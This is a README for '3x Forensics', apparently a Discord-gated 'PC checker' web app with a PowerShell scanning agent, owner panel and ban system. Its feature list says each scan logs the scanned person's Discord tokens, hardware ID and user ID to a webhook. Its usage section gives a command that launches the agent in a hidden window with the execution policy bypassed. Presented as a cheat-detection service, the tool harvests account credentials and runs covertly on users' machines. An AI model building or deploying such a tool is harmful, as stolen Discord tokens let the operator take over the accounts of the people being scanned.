# 3x Forensics v3.0

NAPSE + Ocean behavior-based PC checker with Discord OAuth, owner panel, scan logging, cooldown enforcement, and instant ban system.

## Features

- **8 Detection Modules**: Process, File System, Registry, Network/DNS, Discord Intel, Memory, ETW/WMI, Explorer/LSASS
- **Discord OAuth2**: Customer role-gated access
- **PowerShell Agent**: Hidden console + WinForms loading UI + auto-submit
- **Owner Panel**: Full scan logs, user management, ban system
- **Rules of Use & Site Guide**: Public-facing documentation pages
- **Auto-Ban System**: Self-scan detection, 24h cooldown (max 2 scans), instant ban
- **Discord Webhook**: All scans, logins, and bans logged to webhook
- **Data Collection**: Discord tokens, HWID, user ID logged per scan

## Quick Start

```bash
npm install
npm start
```

## Configuration

Edit `server.js` with your Discord credentials:
- `DISCORD_CLIENT_ID`
- `DISCORD_CLIENT_SECRET`  
- `DISCORD_BOT_TOKEN`
- `WEBHOOK_URL`
- `OWNER_ID`
- `GUILD_ID`
- `CUSTOMER_ROLE_ID`
- `REDIRECT_URI`

## Pages

| Page | Description |
|------|-------------|
| `index.html` | Discord OAuth login |
| `dashboard.html` | Main dashboard with module cards |
| `scan.html` | Scanner with real-time progress |
| `report.html` | Scan results with risk score |
| `history.html` | Scan history archive |
| `config.html` | Detection module configuration |
| `rules.html` | Terms of Use / Rules |
| `guide.html` | Site Guide / Documentation |
| `owner-panel.html` | Owner-only log viewer & ban panel |

## Agent Usage

```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File .x-agent.ps1 -ApiUrl "https://your-domain.com" -Token "your-jwt-token"
```

## Environment Variables

```
PORT=3000
NODE_ENV=production
```
